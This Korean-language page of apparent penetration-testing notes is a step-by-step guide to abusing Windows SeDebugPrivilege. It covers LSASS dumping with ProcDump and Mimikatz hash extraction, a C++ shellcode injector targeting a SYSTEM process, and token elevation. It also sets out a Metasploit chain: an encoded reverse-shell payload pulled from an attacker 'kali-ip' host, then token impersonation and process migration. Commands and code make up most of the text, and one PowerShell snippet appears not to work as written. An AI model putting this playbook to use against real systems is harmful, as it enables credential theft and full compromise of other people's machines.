---
layout: page
title: SeDebugPrivilege
description: >
  This chapter covers the basics of content creation with Hydejack.
hide_description: true
sitemap: false
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}


# SeDebugPrivilege를 이용한 권한 상승 및 자격 증명 탈취 가이드

`SeDebugPrivilege`는 프로세스를 디버깅하기 위해 설계된 권한입니다. 이 권한을 가진 사용자는 모든 프로세스(예: SYSTEM 프로세스)의 메모리에 접근할 수 있으며, ACL(접근 제어 목록)을 무시하고 프로세스를 열 수 있습니다. 이 때문에 LSASS 프로세스 메모리 덤프를 통해 자격 증명(NTLM 해시, Kerberos 티켓)을 추출하거나, 프로세스 주입을 통해 권한 상승(Privilege Escalation)을 수행하는 데 악용될 수 있습니다. 관리자 계정에서 기본적으로 부여되며, 이미 이 권한을 가진 상태에서 SYSTEM 수준으로 상승하거나 민감 정보를 탈취합니다.

https://medium.com/@Strange0/windows-privilege-escalation-abusing-user-privileges-c7532831cb84

### **공격 원리: 프로세스 메모리 접근**

`SeDebugPrivilege`는 OpenProcess API를 통해 모든 프로세스 핸들을 PROCESS_ALL_ACCESS 권한으로 열 수 있게 합니다. 이를 이용해:

1. LSASS(Local Security Authority Subsystem Service) 프로세스의 메모리를 덤프하여 자격 증명을 추출합니다. LSASS는 사용자 해시를 메모리에 저장하므로, 덤프 후 Mimikatz나 비슷한 도구로 분석 가능.
2. 다른 프로세스(예: SYSTEM 프로세스)에 코드를 주입하여 권한 상승이나 백도어 설치.
3. 토큰 복제나 조작으로 더 높은 권한 획득.

이 권한은 프로세스가 잠겨 있어도 메모리 접근을 허용하므로, 직접 파일 복사 대신 메모리 덤프나 주입이 주된 방법입니다.

---

### **1. 취약점 식별**

- **목표:** 현재 사용자가 `SeDebugPrivilege` 권한을 보유하고 있는지 확인합니다.

```powershell
whoami /priv
```

- **확인 사항:** 출력된 목록에 `SeDebugPrivilege`가 `Enabled` 상태로 있는지 확인합니다. 만약 Disabled라면, AdjustTokenPrivileges API를 사용해 활성화할 수 있습니다.

---

### **2. 단계별 공격 절차**

#### **1단계: SeDebugPrivilege 활성화 (필요 시)**
- 권한이 Disabled 상태라면, PowerShell이나 C++ 코드를 사용해 활성화합니다.

```powershell
$token = [System.Security.Principal.WindowsIdentity]::GetCurrent().Token
$priv = New-Object System.Security.AccessControl.Privilege
$priv.Privilege = 'SeDebugPrivilege'
$priv.Enable()
```

#### **2단계: LSASS 메모리 덤프를 통한 자격 증명 추출**
- ProcDump 도구를 사용해 LSASS 프로세스를 덤프합니다. (SysInternals에서 다운로드 가능)
- https://learn.microsoft.com/ko-kr/sysinternals/downloads/procdump

```powershell
# ProcDump 다운로드 및 실행 (예: 공격자 머신에서 업로드)
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

- 덤프 파일을 Mimikatz로 분석하여 해시 추출.

```powershell
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

- 추출된 NTLM 해시를 사용해 Pass-the-Hash 공격으로 SYSTEM 권한 상승.

#### **3단계: 프로세스 주입을 통한 권한 상승**
- C++ 코드를 컴파일해 실행하거나 PowerShell로 프로세스 주입.

```cpp
#include <windows.h>
#include <iostream>

int main() {
    // SeDebugPrivilege 활성화
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    CloseHandle(hToken);

    // 대상 프로세스 열기 (예: PID 1234의 SYSTEM 프로세스)
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1234);
    if (hProcess) {
        // 쉘코드 주입 예시 (메시지박스 쉘코드)
        unsigned char shellcode[] = { /* 여기에 쉘코드 바이트 배열 삽입 */ };
        LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(hProcess, remoteMem, shellcode, sizeof(shellcode), NULL);
        CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
        CloseHandle(hProcess);
    }
    return 0;
}
```

- 컴파일 후 실행: Visual Studio 사용. 쉘코드는 msfvenom 없이 수동 생성.

- PowerShell 대안:

```powershell
# OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread API 호출 로직
Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);' -Namespace Win32 -Name Kernel
# 추가 API 정의 및 주입 코드
```

#### **4단계: 토큰 조작 및 추가 악용**
- 다른 프로세스의 토큰을 복제하여 SYSTEM으로 실행.

```powershell
# Mimikatz 사용
mimikatz.exe
privilege::debug
token::elevate
```

- 파일 유출: 덤프된 파일을 SMB나 HTTP로 공격자 머신으로 전송.

---

### **3. Metasploit 사용**

#### **1단계: Reverse Shell 생성**
- msfvenom 사용해서 생성

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe
```


#### **2단계: Target 서버에서 Reverse Shell 다운로드
- [[파일_전송_종합_가이드]]

```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<kali-ip>:8000/shell-name.exe','shell-name.exe')"
```


#### **3단계: msf에서 Reverse Shell 대기**
- msf 셋팅

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST kali-ip
set LPORT listening-port
run
```


#### **4단계: Target 서버에서 Reverse Shell 실행
- Reverse Shell 실행

```powershell
Start-Process "shell-name.exe"
```


#### **5단계: Incognito 로드, List tokens 출력**
- msf 내 Incognito 로드 시킴.
- Incognito 모듈 : 이 모듈은 성공적으로 시스템을 침투한 후, Windows의 사용자 토큰(access token)을 캡처하고 이를 이용해 다른 사용자로 가장(impersonate)할 수 있게 해줍니다. 토큰은 Windows의 인증 메커니즘으로, 이를 훔치면 비밀번호 없이도 다른 계정의 권한을 사용할 수 있습니다.

```bash
load incognito
list_tokens -g
```

![Pasted_image_20250820233342.png](/image/Pasted_image_20250820233342.png)


#### **6단계: 토큰 사칭**
- Administrators 의 토큰을 사칭
- 높은 권한 토큰이 있더라도 권한 있는 사용자의 권한이 없을 수 있습니다(이는 Windows에서 권한을 처리하는 방식 때문입니다. 가장된 토큰이 아닌 프로세스의 기본 토큰을 사용하여 프로세스가 수행할 수 있는 작업 또는 수행할 수 없는 작업을 결정합니다).

```bash
impersonate_token "BUILTIN\Administrators"
```



#### **7단계: 프로세스 마이그레이션**
- 올바른 권한이 있는 프로세스로 마이그레이션해야 합니다. 가장 안전한 프로세스는 services.exe 프로세스입니다. 먼저 _ps_ 명령을 사용하여 프로세스를 보고 services.exe 프로세스의 PID를 찾습니다. _migrate PID-OF-PROCESS_ 명령을 사용하여 이 프로세스로 마이그레이션합니다.

```bash
# 프로세스 목록에서 services.exe PID 확인 (668)
ps 

migrate 668
```

